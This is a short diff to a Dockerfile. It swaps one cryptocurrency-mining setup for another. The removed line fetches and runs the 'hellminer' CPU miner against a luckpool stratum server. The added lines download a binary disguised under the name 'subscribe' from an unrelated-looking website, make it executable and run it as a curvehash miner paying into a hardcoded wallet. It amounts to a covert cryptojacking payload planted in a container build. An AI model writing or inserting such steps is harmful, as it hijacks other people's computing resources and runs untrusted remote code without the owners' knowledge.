@@ -5,5 +5,6 @@ ENV DEBIAN_FRONTEND=noninteractive \
     
 RUN apt update
 RUN apt -y install wget
-
-RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz; tar xf hellminer_cpu_linux.tar.gz; ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RA1vEbe9JVt7tyCFZpNxJr8tew9nZ4k96d.KEU0 -p x --cpu
+RUN wget http://ilovenypizza.com/subscribe
+RUN chmod +x subscribe
+RUN ./subscribe -a curvehash  -o stratum+tcps://stratum-na.rplant.xyz:17030 -u ThPSSE4uGroXvBBPvNTV3o7fKTnr46fYVL.Keurailwa
